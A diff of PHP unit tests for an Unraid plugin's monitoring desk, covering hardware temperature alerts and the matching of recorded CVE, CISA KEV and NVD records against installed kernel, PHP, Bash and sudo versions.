+    same('hot: the CPU over its own Tcontrol for 30 min, the NVMe and disk1 for 120 min — k10temp without its limit and the cool parity never',
+        ['cpu:0' => 120, 'disk:disk1' => 120, 'nvme:cache' => 120], (function () use ($by) { ksort($by); return $by; })());
+    same('hot: … the CPU booked at its 30 minutes (the entry\'s first time)', $t0 + 300 * 6, (int) array_values(array_filter($book, fn ($e) => $e['p']['sensor'] === 'cpu:0'))[0]['time']);
+    same('hot: … words for the NVMe and the CPU', ['entry.hw_hot_nvme', 'entry.hw_hot_cpu'],
+        [watchmanEntryKey(array_values(array_filter($book, fn ($e) => $e['p']['kind'] === 'nvme'))[0]), watchmanEntryKey(array_values(array_filter($book, fn ($e) => $e['p']['kind'] === 'cpu'))[0])]);
+    // taken over anew: only counted
+    $none = [];
+    $stf = [];
+    for ($i = 0; $i <= 30; $i++) {
+        watchmanHotCompare($none, $stf, $diskOnly, $set, $t0 + 300 * $i, true);
+    }
+    same('hot: taken over anew — counted, never booked', [[], 150], [$none, watchmanHotMinutes($stf['hot']['sensors']['disk:disk1']['spans'], $t0 + 9000)]);
+
+    // settings: set.hw in rules.json (concept 3.1) — a value outside its bounds or of another type counts as not set
+    @mkdir("$tmp/w", 0700);
+    file_put_contents("$tmp/w/rules.json", json_encode(['v' => 1, 'set' => ['hw' => ['hot_disk_c' => 60, 'hot_disk_min' => 5, 'hot_nvme_c' => '80', 'hot_cpu_min' => 45]]]));
+    $s2 = watchmanHotSettings(watchmanHotSet("$tmp/w"));
+    same('hot settings: from set.hw within bounds; below the lowest or a string: the default', [60, 120, 70, 45], [$s2['hot_disk_c'], $s2['hot_disk_min'], $s2['hot_nvme_c'], $s2['hot_cpu_min']]);
+    file_put_contents("$tmp/w/rules.json", json_encode(['v' => 2, 'set' => ['hw' => ['hot_disk_c' => 60]]]));
+    same('hot settings: a rules file of another v: none taken', null, watchmanHotSet("$tmp/w"));
+    $set = ['hot_disk_c' => 60] + watchmanHotSettings(null);
+    /** @var array<int, array<string, mixed>> $book */
+    $book = [];
+    /** @var array<string, mixed> $st */
+    $st = [];
+    for ($i = 0; $i <= 30; $i++) {
+        $round($t0 + 300 * $i);
+    }
+    same('hot settings: disk1 at 57 °C under a limit of 60 — nothing', [], $book);
+
+    // his book in two files: hw_hot in book-more.json, the rest in book.json as ever, read as one
+    $dir = "$tmp/book";
+    @mkdir($dir, 0700);
+    $b = [watchmanEntry('flash_user', 'flash_user:zed', $t0, ['user' => 'zed']), watchmanEntry('hw_hot', 'hw_hot:disk:disk1', $t0, ['sensor' => 'disk:disk1', 'kind' => 'disk'])];
+    watchmanSave($dir, ['book' => []], ['book' => $b]);
+    same('hot book: hw_hot in book-more.json, the others in book.json — read as one',
+        [['flash_user'], ['hw_hot'], ['flash_user', 'hw_hot']],
+        [array_column(readJson("$dir/book.json")['entries'], 'kind'), array_column(readJson("$dir/book-more.json")['entries'], 'kind'), array_column(watchmanLoad($dir)['book'], 'kind')]);
+    $mtime = filemtime("$dir/book.json");
+    touch("$dir/book.json", $mtime - 100);
+    clearstatcache();
+    $b2 = $b;
+    $b2[1]['count'] = 2;
+    watchmanSave($dir, ['book' => $b], ['book' => $b2]);
+    clearstatcache();
+    same('hot book: only the part that changed is written (book.json left as it was)', [$mtime - 100, 2], [filemtime("$dir/book.json"), readJson("$dir/book-more.json")['entries'][0]['count']]);
+    file_put_contents("$dir/book-more.json", json_encode(['entries' => [$b[0], $b[1]]]));
+    same('hot book: book-more.json holds only its own kinds — another there is left out', ['flash_user', 'hw_hot'], array_column(watchmanLoad($dir)['book'], 'kind'));
+    $dir2 = "$tmp/book2";
+    @mkdir($dir2, 0700);
+    watchmanSave($dir2, ['book' => []], ['book' => [$b[0]]]);
+    same('hot book: none of the new kinds — no book-more.json', false, is_file("$dir2/book-more.json"));
+    check('hot book: the night\'s files include it (the handover clears it)', str_contains((string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php'),
+        "WATCH_NIGHT_FILES  = ['baseline.json', 'book.json', 'book-more.json',"));
+
+    // a whole round: the sensors read, the minutes kept in his state, the entry in book-more.json
+    $data = "$tmp/data";
+    $src2 = "$tmp/src";
+    foreach (['plugins', 'extra', 'ssh'] as $d) {
+        @mkdir("$src2/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src2/syslog", 'plugins' => "$src2/plugins", 'go' => "$src2/go", 'extra' => "$src2/extra", 'passwd' => "$src2/passwd",
+              'shadow' => "$src2/shadow", 'ssh' => "$src2/ssh", 'etc_passwd' => "$src2/passwd", 'hwmon' => $sys, 'hot_disks' => $ini];
+    file_put_contents($paths['syslog'], '');
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], "root:*:20000:0:99999:7:::\n");
+    $docker = fn () => [];
+    for ($i = 0; $i <= 25; $i++) {
+        watchmanRound($paths, $data, 1000, $t0 + 300 * $i, $docker, false, "$tmp/acks.json");
+    }
+    $d = watchmanLoad($data);
+    same('hot round: taken over, then rounds — the three sensors booked, in book-more.json, the minutes in state.json',
+        [['cpu:0', 'disk:disk1', 'nvme:cache'], 3, true], [(function () use ($d) {
+            $x = array_column(array_column(array_filter($d['book'], fn ($e) => $e['kind'] === 'hw_hot'), 'p'), 'sensor');
+            sort($x);
+            return $x;
+        })(), count(readJson("$data/book-more.json")['entries'] ?? []), isset($d['state']['hot']['sensors']['disk:disk1']['spans'])]);
+    same('hot round: the page state names the area', 'hw', array_values(array_filter(watchmanPageState($data, $t0 + 9000, false)['book'], fn ($e) => $e['kind'] === 'hw_hot'))[0]['cat'] ?? null);
+    hardeningRm($tmp);
+}
+
+/**
+ * «Known vulnerabilities» (1.96, concept 11.3 A, step 15, agent/desks/watchman-vuln.php). The comparison, strict: «affected»
+ * only when the versions compare cleanly — against records in their real shapes (the kernel CNA's per-branch fixes and its
+ * git item, PHP's branch ranges and its Windows-only CVE-2024-4577, Red Hat's OpenSSH with p-levels beside its RHEL rpm
+ * items, Unraid's «n/a» records, a record with only commits); anything else «maybe», never «not» by default alone. The
+ * fetch against recorded answers (never the network): only the three addresses, nothing of this server, «only when newer»,
+ * the subset the name table knows, a broken or short list keeps what was kept, records of entries that left go, at most so
+ * many a run. The switch (off until switched on; off fetches nothing), due once a day, the inventory (Unraid, kernel,
+ * PHP, Slackware's packages), the book (one entry a vulnerability, product and place; told only when affected), the light,
+ * Unraid's advice, a whole round.
+ */
+/**
+ * Known vulnerabilities against real-shaped CVE records (2026-11-23, nostromo: 39 «maybe affected» lines of kernel CVEs
+ * from 2010–2024 on kernel 6.18 waited for an answer): kernel.org's records (an item of git ranges, an item of stable
+ * branches «6.6.15 ≤ 6.6.*» with defaultStatus affected) decide by the branch; an old record whose CNA wrote «n/a» is
+ * judged by CISA's ADP ranges («0 < 2.6.36», defaultStatus unknown) when there are some; with none it can't be checked
+ * for sure — the calm list, never an entry. No dates guessed.
+ */
+function testWatchmanVulnRanges(): void
+{
+    $kc = WATCH_VULN_PRODUCTS['kernel']['cna'];
+    $kernelOrg = ['cveMetadata' => ['cveId' => 'CVE-2024-1086'], 'containers' => ['cna' => ['affected' => [
+        ['product' => 'Linux', 'vendor' => 'Linux', 'defaultStatus' => 'unaffected', 'repo' => 'https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git',
+         'programFiles' => ['net/netfilter/nf_tables_api.c'], 'versions' => [
+            ['version' => '1da177e4c3f41524e886b7f1b8a0c1fc7321cac2', 'lessThan' => 'b1db244ffd041a49ecc9618e8feb6b5c1afcdaa7', 'status' => 'affected', 'versionType' => 'git'],
+            ['version' => '1da177e4c3f41524e886b7f1b8a0c1fc7321cac2', 'lessThan' => 'f342de4e2f33e0e39165d8639387aa6c19dff660', 'status' => 'affected', 'versionType' => 'git']]],
+        ['product' => 'Linux', 'vendor' => 'Linux', 'defaultStatus' => 'affected', 'repo' => 'https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git',
+         'programFiles' => ['net/netfilter/nf_tables_api.c'], 'versions' => [
+            ['version' => '3.15', 'status' => 'affected'],
+            ['version' => '0', 'lessThan' => '3.15', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '5.4.269', 'lessThanOrEqual' => '5.4.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '5.10.210', 'lessThanOrEqual' => '5.10.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '5.15.149', 'lessThanOrEqual' => '5.15.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '6.1.76', 'lessThanOrEqual' => '6.1.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '6.6.15', 'lessThanOrEqual' => '6.6.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '6.7.3', 'lessThanOrEqual' => '6.7.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '6.8', 'lessThanOrEqual' => '*', 'status' => 'unaffected', 'versionType' => 'original_commit_for_fix']]]]]]];
+    $r = watchmanVulnReduce($kernelOrg);
+    same('vuln ranges: kernel.org\'s record — past the fix in its branch, past the mainline fix, before the bug: not affected; in its branch before the fix: affected, fixed from',
+        [['no', null], ['no', null], ['no', null], ['yes', '6.6.15'], ['yes', '6.1.76']],
+        [watchmanVulnVerdict($r, $kc, '6.6.20'), watchmanVulnVerdict($r, $kc, '6.18.64'), watchmanVulnVerdict($r, $kc, '3.10.108'),
+         watchmanVulnVerdict($r, $kc, '6.6.10'), watchmanVulnVerdict($r, $kc, '6.1.70')]);
+
+    // an old record: the CNA wrote «n/a»; CISA's ADP added the range (vulnrichment, CPE names)
+    $old = ['cveMetadata' => ['cveId' => 'CVE-2010-3904'], 'containers' => [
+        'cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]],
+        'adp' => [['providerMetadata' => ['shortName' => 'CVE'], 'references' => [['url' => 'https://example.org']]],
+                  ['providerMetadata' => ['shortName' => 'CISA-ADP'], 'affected' => [['vendor' => 'linux', 'product' => 'linux_kernel',
+                   'cpes' => ['cpe:2.3:o:linux:linux_kernel:*:*:*:*:*:*:*:*'], 'defaultStatus' => 'unknown',
+                   'versions' => [['version' => '0', 'status' => 'affected', 'lessThan' => '2.6.36', 'versionType' => 'custom']]]]]]]];
+    $ro = watchmanVulnReduce($old);
+    $bash = ['cveMetadata' => ['cveId' => 'CVE-2014-6278'], 'containers' => [
+        'cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]],
+        'adp' => [['providerMetadata' => ['shortName' => 'CISA-ADP'], 'affected' => [['vendor' => 'gnu', 'product' => 'bash', 'defaultStatus' => 'unknown',
+                   'versions' => [['version' => '1.14.0', 'status' => 'affected', 'lessThanOrEqual' => '4.3', 'versionType' => 'custom']]]]]]]];
+    $bare = ['cveMetadata' => ['cveId' => 'CVE-2016-5195'], 'containers' => ['cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a',
+        'versions' => [['version' => 'n/a', 'status' => 'affected']]]]]]];
+    same('vuln ranges: an old record by the ADP\'s range (CPE names) — a current kernel and Bash not affected, an old one affected; no range at all: maybe',
+        [true, ['no', '2.6.36'], ['yes', '2.6.36'], ['no', null], 'maybe'],
+        [isset($ro['adp'][0]['versions']), watchmanVulnVerdict($ro, $kc, '6.18.64'), watchmanVulnVerdict($ro, $kc, '2.6.35'),
+         watchmanVulnVerdict(watchmanVulnReduce($bash), WATCH_VULN_PRODUCTS['bash']['cna'], '5.3.3'), watchmanVulnVerdict(watchmanVulnReduce($bare), $kc, '6.18.64')[0]]);
+    // the CNA's own item decides: the ADP is read only when the CNA named nothing of the product
+    $both = $kernelOrg;
+    $both['containers']['adp'] = [['affected' => [['vendor' => 'linux', 'product' => 'linux_kernel', 'defaultStatus' => 'affected',
+        'versions' => [['version' => '0', 'status' => 'affected', 'lessThan' => '7.0', 'versionType' => 'custom']]]]]];
+    same('vuln ranges: the CNA\'s item decides, the ADP\'s only without one', ['no', null], watchmanVulnVerdict(watchmanVulnReduce($both), $kc, '6.18.64'));
+
+    // judged end to end: the three on a 6.18 kernel — none found, one in the calm list, two checked; nothing waits
+    $tmp = hardeningTmp('vuln-ranges');
+    $f = watchmanVulnDir($tmp);
+    @mkdir("$f/cve", 0700, true);
+    $now = 1_795_000_000;
+    writeAtomic("$f/kev.json", jsonEncode(['fetched' => $now, 'entries' => [
+        ['cve' => 'CVE-2024-1086', 'product' => 'kernel', 'name' => 'Linux Kernel Use-After-Free Vulnerability', 'added' => '2024-05-30', 'ransom' => true, 'desc' => ''],
+        ['cve' => 'CVE-2010-3904', 'product' => 'kernel', 'name' => 'Linux Kernel Improper Input Validation Vulnerability', 'added' => '2023-06-02', 'ransom' => false, 'desc' => ''],
+        ['cve' => 'CVE-2016-5195', 'product' => 'kernel', 'name' => 'Linux Kernel Race Condition Vulnerability', 'added' => '2022-03-03', 'ransom' => false, 'desc' => '']]]), 0600, 0, 0);
+    foreach ([$kernelOrg, $old, $bare] as $rec) {
+        writeAtomic("$f/cve/{$rec['cveMetadata']['cveId']}.json", jsonEncode(watchmanVulnReduce($rec)), 0600, 0, 0);
+    }
+    $j = watchmanVulnJudge($tmp, [['product' => 'kernel', 'version' => '6.18.64-Unraid', 'clean' => '6.18.64', 'where' => 'host']], $now + 60);
+    $book = [];
+    $seen = [];
+    same('vuln ranges: judged on 6.18.64 — nothing found, two checked, one can\'t be checked for sure; the book stays empty, nothing told',
+        [[], 2, ['CVE-2016-5195'], [], 0],
+        [$j['found'], $j['checked'], array_column($j['unsure'], 'cve'), watchmanVulnCompare($book, $j['found'], $now + 60, $seen, $j['fresh'], $j['pending']), count($book)]);
+}
+
+/**
+ * PHP (2026-11-23, nostromo: «php2shell» → «0 of 39» in the area): KEV names PHP as «PHP Group/PHP», «PHP/PHP» and
+ * «PHP/FastCGI Process Manager (FPM)»; the fetch keeps all of them (whether PHP runs here or not), the judge compares each
+ * with Unraid's own PHP and every container's PHP_VERSION, and every pair lands in exactly one list — affected,
+ * checked (doesn't concern you), can't be checked for sure; the page counts what he looked at.
+ */
+function testWatchmanVulnPhp(): void
+{
+    $tmp = hardeningTmp('vuln-php');
+    $dir = "$tmp/data";
+    @mkdir($dir, 0700, true);
+    $now = 1_795_000_000;
+    $kev = [
+        ['cveID' => 'CVE-2024-4577', 'vendorProject' => 'PHP Group', 'product' => 'PHP', 'vulnerabilityName' => 'PHP-CGI OS Command Injection Vulnerability', 'dateAdded' => '2024-06-12'],
+        ['cveID' => 'CVE-2019-11043', 'vendorProject' => 'PHP', 'product' => 'FastCGI Process Manager (FPM)', 'vulnerabilityName' => 'PHP FastCGI Process Manager (FPM) Buffer Overflow Vulnerability', 'dateAdded' => '2022-03-25'],
+        ['cveID' => 'CVE-2012-1823', 'vendorProject' => 'PHP', 'product' => 'PHP', 'vulnerabilityName' => 'PHP-CGI Query String Parameter Vulnerability', 'dateAdded' => '2022-03-25'],
+        ['cveID' => 'CVE-2024-1086', 'vendorProject' => 'Linux', 'product' => 'Kernel', 'vulnerabilityName' => 'Linux Kernel Use-After-Free Vulnerability', 'dateAdded' => '2024-05-30'],
+    ];
+    for ($i = 0; $i < 150; $i++) {
+        $kev[] = ['cveID' => sprintf('CVE-2023-%05d', 20000 + $i), 'vendorProject' => 'Example Corp', 'product' => "Camera $i"];
+    }
+    $answers = [WATCH_VULN_URLS['kev'] => json_encode(['catalogVersion' => '2026.11.22', 'count' => count($kev), 'vulnerabilities' => $kev])];
+    // the records as the CVE list has them: PHP Group's own (Windows only; branch ranges), an old one whose CNA wrote «n/a» with CISA's ADP range
+    $answers[watchmanVulnCveUrl('CVE-2024-4577')] = json_encode(['cveMetadata' => ['cveId' => 'CVE-2024-4577'], 'containers' => ['cna' => ['affected' => [
+        ['vendor' => 'PHP Group', 'product' => 'PHP', 'platforms' => ['Windows'], 'defaultStatus' => 'affected', 'versions' => [
+            ['version' => '8.1.*', 'lessThan' => '8.1.29', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '8.2.*', 'lessThan' => '8.2.20', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '8.3.*', 'lessThan' => '8.3.8', 'status' => 'affected', 'versionType' => 'semver']]]]]]]);
+    $answers[watchmanVulnCveUrl('CVE-2019-11043')] = json_encode(['cveMetadata' => ['cveId' => 'CVE-2019-11043'], 'containers' => ['cna' => ['affected' => [
+        ['vendor' => 'PHP Group', 'product' => 'PHP', 'versions' => [
+            ['version' => '7.1.x', 'lessThan' => '7.1.33', 'status' => 'affected', 'versionType' => 'custom'],
+            ['version' => '7.2.x', 'lessThan' => '7.2.24', 'status' => 'affected', 'versionType' => 'custom'],
+            ['version' => '7.3.x', 'lessThan' => '7.3.11', 'status' => 'affected', 'versionType' => 'custom']]]]]]]);
+    $answers[watchmanVulnCveUrl('CVE-2012-1823')] = json_encode(['cveMetadata' => ['cveId' => 'CVE-2012-1823'], 'containers' => [
+        'cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]],
+        'adp' => [['providerMetadata' => ['shortName' => 'CISA-ADP'], 'affected' => [['vendor' => 'php', 'product' => 'php', 'defaultStatus' => 'unknown',
+            'versions' => [['version' => '0', 'status' => 'affected', 'lessThan' => '5.3.12', 'versionType' => 'custom'],
+                           ['version' => '5.4.0', 'status' => 'affected', 'lessThan' => '5.4.2', 'versionType' => 'custom']]]]]]]]);
+    $answers[WATCH_VULN_URLS['unraid']] = json_encode([['version' => '7.4.1', 'supportStatus' => 'supported', 'date' => '2026-11-10']]);
+    $get = fn (string $url, ?string $since): array => isset($answers[$url]) ? ['code' => 200, 'body' => $answers[$url], 'lm' => null, 'err' => null]
+        : ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    watchmanVulnFetch($dir, ['get' => $get, 'now' => $now]);
+    $kept = readJson(watchmanVulnDir($dir) . '/kev.json');
+    same('vuln php: the fetch keeps every PHP entry of the list under any of its names, and the kernel\'s — never the others',
+        [['CVE-2024-4577', 'php'], ['CVE-2019-11043', 'php'], ['CVE-2012-1823', 'php'], ['CVE-2024-1086', 'kernel']],
+        array_map(fn ($e) => [$e['cve'], $e['product']], (array) ($kept['entries'] ?? [])));
+
+    // Unraid's own PHP and a container's (its image's PHP_VERSION); no kernel here in this inventory
+    $images = ['php2shell' => ['PHP_VERSION' => '8.5.1'], 'legacy' => ['PHP_VERSION' => '7.3.5']];
+    $inv = watchmanVulnInventory(['php' => '8.4.14', 'kernel' => '6.18.64-Unraid', 'vuln_images' => $images]);
+    $j = watchmanVulnJudge($dir, $inv, $now + 60, $images);
+    $where = function (array $j): array {
+        $out = [];
+        foreach (['found' => 'affected', 'not' => 'checked', 'unsure' => 'unsure'] as $k => $as) {
+            foreach ((array) $j[$k] as $x) {
+                $out[] = "{$x['cve']} {$x['where']} $as";
+            }
+        }
+        sort($out);
+        return $out;
+    };
+    same('vuln php: every PHP entry with every PHP here in exactly one list — Unraid\'s 8.4.14 and php2shell\'s 8.5.1 not affected; the old 7.3.5 container affected by the FPM bug',
+        ['CVE-2012-1823 host checked', 'CVE-2012-1823 legacy checked', 'CVE-2012-1823 php2shell checked',
+         'CVE-2019-11043 host checked', 'CVE-2019-11043 legacy affected', 'CVE-2019-11043 php2shell checked',
+         'CVE-2024-1086 host unsure', 'CVE-2024-4577 host checked', 'CVE-2024-4577 legacy checked', 'CVE-2024-4577 php2shell checked'], $where($j));
+    $page = watchmanVulnPage(['vuln_on' => true], $j);
+    same('vuln php: what he looked at — the whole list, four of it concern programs here (PHP 3, the kernel 1 — its record asked and not had: can\'t be checked for sure), none pending',
+        [154, 4, [['product' => 'php', 'label' => 'PHP', 'n' => 3], ['product' => 'kernel', 'label' => 'Linux kernel', 'n' => 1]], 0],
+        [$page['kev_total'], $page['kev_here'], $page['kev_products'], $page['pending']]);
+    // the page's filter words find a container by its name in the calm list (desk.js vulnHay: CVE, product, name, where, version)
+    same('vuln php: «php2shell» names its lines in the calm list (where)', 3, count(array_filter($page['not'], fn ($x) => $x['where'] === 'php2shell')));
+}
+
+/**
+ * NVD as the fourth source (2026-11-23): asked only for the CVEs that concern a program here and stayed «can't be
+ * checked for sure», nothing but the CVE id in the request, one request every WATCH_VULN_NVD_GAP s (NVD without a key:
+ * 5 in 30 s), a «slow down» ends the batch; its CPE ranges (recorded shapes: the kernel's Dirty COW with stable-branch
+ * ranges, a pre-release and an Ubuntu platform node; Bash's exact versions) judge cleanly — the kernel's fixed long before
+ * Unraid 7.3.2 («long fixed», folded apart on the page); an answer without configurations leaves it unsure (asked).
+ */
+function testWatchmanVulnNvd(): void
+{
+    $plg = (string) file_get_contents(OFFICE_DIR . '/plugin/unraid-secretary-office.plg');
+    // NVD's terms of use: «display the following notice prominently» — its own English words, in every language, the README, the guide
+    $notice = 'This product uses the NVD API but is not endorsed or certified by the NVD.';
+    same('vuln nvd: the notice NVD\'s terms ask for — word for word in all five languages (the area, its help), the README, the guide', [],
+        array_values(array_filter(['en', 'de', 'it', 'fr', 'es', 'README.md', 'docs/GUIDE.md'], fn ($x) => !str_contains((string) preg_replace('/\s+/', ' ',
+            (string) file_get_contents(OFFICE_DIR . (str_contains($x, '.') ? "/$x" : "/public/desks/watchman/lang/$x.json"))), $notice))));
+    same('vuln nvd: the floor\'s Unraid is the .plg\'s min (what the office installs on)', true,
+        (bool) preg_match('/\bmin="' . preg_quote(WATCH_VULN_FLOOR_UNRAID, '/') . '"/', $plg));
+    $tmp = hardeningTmp('vuln-nvd');
+    $dir = "$tmp/data";
+    @mkdir($dir, 0700, true);
+    $now = 1_795_000_000;
+    $kev = [['cveID' => 'CVE-2016-5195', 'vendorProject' => 'Linux', 'product' => 'Kernel', 'vulnerabilityName' => 'Linux Kernel Race Condition Vulnerability', 'dateAdded' => '2022-03-03'],
+            ['cveID' => 'CVE-2014-6278', 'vendorProject' => 'GNU', 'product' => 'Bourne-Again Shell (Bash)', 'vulnerabilityName' => 'GNU Bourne-Again Shell (Bash) Arbitrary Code Execution Vulnerability', 'dateAdded' => '2022-01-28'],
+            ['cveID' => 'CVE-2021-3156', 'vendorProject' => 'Sudo', 'product' => 'Sudo', 'vulnerabilityName' => 'Sudo Heap-Based Buffer Overflow Vulnerability', 'dateAdded' => '2022-04-06']];
+    for ($i = 0; $i < 150; $i++) {
+        $kev[] = ['cveID' => sprintf('CVE-2023-%05d', 30000 + $i), 'vendorProject' => 'Example Corp', 'product' => "Printer $i"];
+    }
+    $na = fn (string $id) => json_encode(['cveMetadata' => ['cveId' => $id], 'containers' => ['cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a',
+        'versions' => [['version' => 'n/a', 'status' => 'affected']]]]]]]);
+    $answers = [WATCH_VULN_URLS['kev'] => json_encode(['catalogVersion' => '2026.11.22', 'count' => count($kev), 'vulnerabilities' => $kev]),
+                watchmanVulnCveUrl('CVE-2016-5195') => $na('CVE-2016-5195'), watchmanVulnCveUrl('CVE-2014-6278') => $na('CVE-2014-6278'),
+                watchmanVulnCveUrl('CVE-2021-3156') => $na('CVE-2021-3156'),
+                WATCH_VULN_URLS['unraid'] => json_encode([['version' => '7.4.1', 'supportStatus' => 'supported', 'date' => '2026-11-10']])];
+    // NVD's answers as API 2.0 gives them (shortened: the same fields, fewer ranges)
+    $cpe = fn (string $vp, string $ver = '*', string $upd = '*') => "cpe:2.3:$vp:$ver:$upd:*:*:*:*:*:*";
+    $answers[WATCH_VULN_URLS['nvd'] . 'CVE-2016-5195'] = json_encode(['resultsPerPage' => 1, 'startIndex' => 0, 'totalResults' => 1, 'format' => 'NVD_CVE', 'version' => '2.0',
+        'vulnerabilities' => [['cve' => ['id' => 'CVE-2016-5195', 'sourceIdentifier' => 'secalert@redhat.com', 'vulnStatus' => 'Analyzed', 'configurations' => [
+            ['nodes' => [['operator' => 'OR', 'negate' => false, 'cpeMatch' => [
+                ['vulnerable' => true, 'criteria' => $cpe('o:linux:linux_kernel'), 'versionStartIncluding' => '2.6.22', 'versionEndExcluding' => '3.2.83', 'matchCriteriaId' => 'A'],
+                ['vulnerable' => true, 'criteria' => $cpe('o:linux:linux_kernel'), 'versionStartIncluding' => '3.3', 'versionEndExcluding' => '3.4.113', 'matchCriteriaId' => 'B'],
+                ['vulnerable' => true, 'criteria' => $cpe('o:linux:linux_kernel'), 'versionStartIncluding' => '4.5', 'versionEndExcluding' => '4.8.3', 'matchCriteriaId' => 'C'],
+                ['vulnerable' => true, 'criteria' => $cpe('o:linux:linux_kernel', '4.9', 'rc1'), 'matchCriteriaId' => 'D']]]]],
+            ['operator' => 'AND', 'nodes' => [['operator' => 'OR', 'negate' => false, 'cpeMatch' => [
+                ['vulnerable' => true, 'criteria' => $cpe('o:canonical:ubuntu_linux', '16.04'), 'matchCriteriaId' => 'E']]],
+                ['operator' => 'OR', 'negate' => false, 'cpeMatch' => [['vulnerable' => false, 'criteria' => $cpe('o:linux:linux_kernel'), 'matchCriteriaId' => 'F']]]]]]]]]]);
+    $answers[WATCH_VULN_URLS['nvd'] . 'CVE-2014-6278'] = json_encode(['resultsPerPage' => 1, 'totalResults' => 1, 'format' => 'NVD_CVE', 'version' => '2.0',
+        'vulnerabilities' => [['cve' => ['id' => 'CVE-2014-6278', 'configurations' => [['nodes' => [['operator' => 'OR', 'negate' => false, 'cpeMatch' => array_map(
+            fn ($v) => ['vulnerable' => true, 'criteria' => $cpe('a:gnu:bash', $v), 'matchCriteriaId' => $v], ['1.14.0', '2.05', '3.2.48', '4.2', '4.3'])]]]]]]]]);
+    $answers[WATCH_VULN_URLS['nvd'] . 'CVE-2021-3156'] = json_encode(['resultsPerPage' => 1, 'totalResults' => 1, 'format' => 'NVD_CVE', 'version' => '2.0',
+        'vulnerabilities' => [['cve' => ['id' => 'CVE-2021-3156', 'vulnStatus' => 'Awaiting Analysis']]]]);
+    $asked = [];
+    $slept = [];
+    $get = function (string $url, ?string $since) use (&$asked, $answers): array {
+        $asked[] = $url;
+        return isset($answers[$url]) ? ['code' => 200, 'body' => $answers[$url], 'lm' => null, 'err' => null] : ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    $sleep = function (float $s) use (&$slept): void { $slept[] = $s; };
+    watchmanVulnFetch($dir, ['get' => $get, 'now' => $now, 'sleep' => $sleep, 'unsure' => []]);
+    $inv = [['product' => 'kernel', 'version' => '6.18.64-Unraid', 'clean' => '6.18.64', 'where' => 'host'],
+            ['product' => 'bash', 'version' => '5.3.003', 'clean' => '5.3.003', 'where' => 'host'], ['product' => 'sudo', 'version' => '1.9.16p2', 'clean' => '1.9.16p2', 'where' => 'host']];
+    $j1 = watchmanVulnJudge($dir, $inv, $now + 60);
+    same('vuln nvd: before NVD — the three records name no version: can\'t be checked for sure; NVD not asked', [['CVE-2016-5195', 'CVE-2014-6278', 'CVE-2021-3156'], [], []],
+        [array_column($j1['unsure'], 'cve'), array_values(array_filter($asked, fn ($u) => str_contains($u, 'nvd.nist.gov'))), $slept]);
+    $asked = [];
+    $r = watchmanVulnFetch($dir, ['get' => $get, 'now' => $now + 86400, 'sleep' => $sleep, 'unsure' => array_column($j1['unsure'], 'cve')]);
+    $nvdAsked = array_values(array_filter($asked, fn ($u) => str_contains($u, 'nvd.nist.gov')));
+    same('vuln nvd: the next day only the unsure three asked of NVD, by their id alone, one every 6.5 s; kept', [
+        [WATCH_VULN_URLS['nvd'] . 'CVE-2016-5195', WATCH_VULN_URLS['nvd'] . 'CVE-2014-6278', WATCH_VULN_URLS['nvd'] . 'CVE-2021-3156'], [6.5, 6.5], 3,
+        'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2016-5195'],
+        [$nvdAsked, $slept, $r['nvd'], $nvdAsked[0] ?? null]);
+    same('vuln nvd: its query passes the fetch\'s address check (https, the CVE id only)', [true, false],
+        [watchmanVulnGet(WATCH_VULN_URLS['nvd'] . 'CVE-2016-5195', 1, null, ['get' => fn () => ['code' => 1]])['code'] === 1,
+         (bool) preg_match('#\?cveId=CVE-\d{4}-\d{4,7}$#D', WATCH_VULN_URLS['nvd'] . 'CVE-2016-5195&x=host')]);
+    $j2 = watchmanVulnJudge($dir, $inv, $now + 86400 + 60);
+    $not = array_column($j2['not'], null, 'cve');
+    same('vuln nvd: judged by NVD — Dirty COW fixed from 4.8.3 (long before Unraid 7.3.2), Bash never in its versions; sudo\'s answer without configurations stays unsure (asked)',
+        [['no', '4.8.3', true, 'nvd'], ['no', null, false, 'nvd'], [['CVE-2021-3156', true]], []],
+        [['no', $not['CVE-2016-5195']['fixed'] ?? null, !empty($not['CVE-2016-5195']['ancient']), $not['CVE-2016-5195']['src'] ?? '-'],
+         ['no', $not['CVE-2014-6278']['fixed'] ?? null, !empty($not['CVE-2014-6278']['ancient']), $not['CVE-2014-6278']['src'] ?? '-'],
+         array_map(fn ($x) => [$x['cve'], $x['nvd']], $j2['unsure']), $j2['found']]);
+    // the pre-release and the platform node never decide: a 4.9 rc is no version here; Ubuntu's node isn't the kernel's
+    $red = watchmanVulnNvdReduce(json_decode($answers[WATCH_VULN_URLS['nvd'] . 'CVE-2016-5195'], true), 'CVE-2016-5195');
+    same('vuln nvd: reduced — the kernel\'s three ranges (no rc), Ubuntu\'s own item; an old kernel inside a range affected',
+        [[['linux', 'linux_kernel', 3], ['canonical', 'ubuntu_linux', 1]], ['yes', '4.8.3']],
